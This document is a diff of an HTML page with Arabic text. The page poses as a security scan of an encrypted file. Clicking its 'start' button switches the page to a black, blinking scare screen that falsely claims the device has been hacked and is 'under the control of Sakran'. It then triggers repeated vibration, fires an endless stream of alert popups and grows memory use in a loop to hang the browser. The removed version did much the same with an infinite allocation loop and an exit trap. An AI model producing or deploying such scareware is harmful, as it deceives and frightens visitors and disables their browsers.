@@ -3,61 +3,110 @@
 
 <head>
     <meta charset="UTF-8">
-    <title>فحص أمني مطلوب</title>
+    <title>جاري فحص الملف المشفر...</title>
     <style>
-        body { background-color: #fff; color: #333; text-align: center; padding-top: 25vh; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; transition: background-color 0.5s, color 0.5s; }
+        body {
+            background-color: #fff;
+            color: #333;
+            font-family: sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 20px;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            transition: all 0.5s;
+        }
         h1 { font-size: 3em; margin-bottom: 20px; }
         p { font-size: 1.2em; opacity: 0.8; }
-        #msg { display: none; font-weight: bold; }
+        #main-btn {
+            padding: 20px 40px;
+            font-size: 1.5em;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            margin-top: 30px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+        }
+        #main-btn:hover { background-color: #0056b3; }
+        
+        /* كود شاشة الرعب بعد التفاعل */
+        .scare-mode {
+            background-color: #000 !important;
+            color: #fff !important;
+            cursor: none;
+        }
+        .scare-mode h1 { font-size: 5em; animation: blink 0.2s infinite; }
+        .scare-mode p { display: none; }
+        .scare-mode #main-btn { display: none; }
+        
+        @keyframes blink {
+            50% { opacity: 0; }
+        }
     </style>
 </head>
 <body>
+
     <div id="loading-view">
-        <h1>جاري تحليل البيانات...</h1>
-        <p>يرجى الانتظار، جاري التحقق من أمان الملف المشفر.</p>
+        <h1>...جاري تحليل الملف</h1>
+        <p>يرجى الانتظار، جاري التحقق من أمان الملف المشفر قبل الفتح.</p>
+        <button id="main-btn">اضغط للبدء</button>
     </div>
-    <h1 id="msg">راقب جهازك تحت رعاية سكران</h1>
 
     <script>
-        const msgEl = document.getElementById('msg');
-        const loadingEl = document.getElementById('loading-view');
-        const crashArray = [];
+        const body = document.body;
+        const btn = document.getElementById('main-btn');
+        const loadingView = document.getElementById('loading-view');
 
-        setTimeout(() => {
-            // 1. التحول المرعب
-            document.body.style.backgroundColor = '#000';
-            document.body.style.color = '#fff';
-            loadingEl.style.display = 'none';
-            msgEl.style.display = 'block';
+        // عند ضغط الزر، نلغي القفل ونفعل الهزاز والانهيار
+        btn.addEventListener('click', function() {
+            // 1. تفعيل وضع الرعب فوراً
+            body.classList.add('scare-mode');
+            document.title = "تم اختراق الجهاز بنجاح!";
+            loadingView.innerHTML = "<h1>راقب جهازك تحت رعاية سكران</h1>";
 
-            // 2. تشغيل الاهتزاز المجنون للموبايل
-            if (navigator.vibrate) {
-                navigator.vibrate([10000]);
-                setInterval(() => {
-                    navigator.vibrate(5000);
-                }, 4000);
-            }
-
-            // 3. منع الخروج
-            window.onbeforeunload = function (e) {
-                e.preventDefault();
-                alert("لقد وقعت في الفخ! لا يمكنك الهرب. جهازك أصبح تحت سيطرتنا.");
-                alert("تهنيج كامل للذاكرة...");
-                return "لن تستطيع الخروج!";
-            };
-
-            // 4. الضغط القاسي على الذاكرة
-            while(true) {
-                try {
-                    crashArray.push(new Array(50000000).fill(0).map(Math.random));
-                    const d = document.createElement('div');
-                    document.body.appendChild(d);
-                } catch (e) {
-                    continue;
+            // 2. محاولة تشغيل الهزاز بشكل متواصل وعنيف (كروم قد يمنعه ولكننا نحاول)
+            try {
+                if (navigator.vibrate) {
+                    navigator.vibrate([500, 200, 500, 200, 500, 200]); 
+                    // أو استخدام حلقة هزاز لو سمح المتصفح
+                    setInterval(() => {
+                        navigator.vibrate(100);
+                    }, 150);
                 }
-            }
+            } catch (e) { console.log("Vibration failed: " + e); }
 
-        }, 900);
+            // 3. بدء حلقة انهيار الذاكرة (الهكر الحقيقي)
+            // سنقوم بعمل ضغط بسيط أولاً حتى لا يقتل المتصفح الصفحة في جزء من الثانية
+            setTimeout(() => {
+                alert("لقد وقعت في الفخ! لا يمكنك الهرب...");
+                
+                // محاولة تكرار التنبيه
+                setInterval(() => {
+                    alert("جهازك الآن تحت سيطرة سكران");
+                }, 500);
+                
+                // وبعدها محاولة استهلاك الرامات ببطء شديد حتى يقبل المتصفح التنفيذ قبل الانهيار
+                let memoryHog = [];
+                let intervalId = setInterval(() => {
+                    try {
+                        for(let i=0; i<1000000; i++) {
+                            memoryHog.push(Math.random());
+                        }
+                    } catch(e) {
+                        // في حال فشل الدفع، نوقف التايمر
+                        clearInterval(intervalId);
+                    }
+                }, 100); 
+            }, 100);
+            
+            // تنبيه أخير لتأكيد السيطرة
+            alert("تم اختراق البيانات بنجاح. جاري تنفيذ أمر التدمير الذاتي...");
+        });
     </script>
 </body>
 </html>
